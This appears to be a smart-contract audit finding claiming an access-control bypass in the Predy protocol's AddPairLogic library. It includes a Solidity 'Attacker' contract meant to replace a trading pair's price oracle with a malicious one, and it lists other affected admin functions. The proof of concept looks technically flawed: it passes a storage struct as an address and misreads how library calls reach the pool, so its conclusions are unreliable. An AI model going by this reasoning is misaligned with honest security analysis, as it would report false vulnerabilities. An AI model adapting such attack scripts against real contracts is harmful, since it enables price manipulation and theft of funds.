# Vulnerability details

## Impact

The impact of the vulnerability where a malicious user can directly call the external functions in the `AddPairLogic` library, bypassing intended access controls in the `PredyPool` contract.

## Proof of Concept

Let's consider an example where a malicious user can update the price feed of any pair they want.

The attacker first identifies that the [updatePriceOracle](https://github.com/code-423n4/2024-05-predy/blob/2fb1e0ec7a52fc06c2e9c8e561bccba84302e4bb/src/libraries/logic/AddPairLogic.sol#L112) function in the `AddPairLogic` library is callable `externally` and does not have its own access controls. This function is intended to be used only through the [PredyPool::updatePriceOracle](https://github.com/code-423n4/2024-05-predy/blob/a9246db5f874a91fb71c296aac6a66902289306a/src/PredyPool.sol#L167), which ideally should enforce access controls like `onlyPoolOwner`.

Using the `interface`, the attacker calls `updatePriceOracle` directly on the `PredyPool` contract address, passing in the storage reference to the PairStatus object and the address of a malicious price oracle controlled by the attacker.

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface AddPairLogicInterface {
function updatePriceOracle(address pairStatus, address newPriceOracle) external;

}

contract Attacker {
AddPairLogicInterface public addPairLogic;

    constructor(address predyPoolAddress) {
        // Cast the PredyPool address to the AddPairLogicInterface
        addPairLogic = AddPairLogicInterface(predyPoolAddress);
    }

    function attack(address pairStatus, address maliciousOracle) public {
        // Directly call the updatePriceOracle function to change the price feed
        addPairLogic.updatePriceOracle(pairStatus, maliciousOracle);
    }

}
```

Changing the Price Feed: the price feed for the specified pair in the `PredyPool` contract is changed to the attacker's specified address. This allows the attacker to manipulate the pricing mechanism, potentially leading to financial gain through trades based on the manipulated prices.

Note: The following functions in the `Predy pool` are also affected:

- `updateFeeRatio`
- `updatePoolOwner`
- `updateAssetRiskParams`
- `updateIRMParams`

## Tools Used

Manual review

## Recommended Mitigation Steps

Restrict Library Function Accessibility: Ensure that all library functions that are not intended to be called `externally` are marked as `internal`. This prevents them from being exposed to external contracts or addresses.
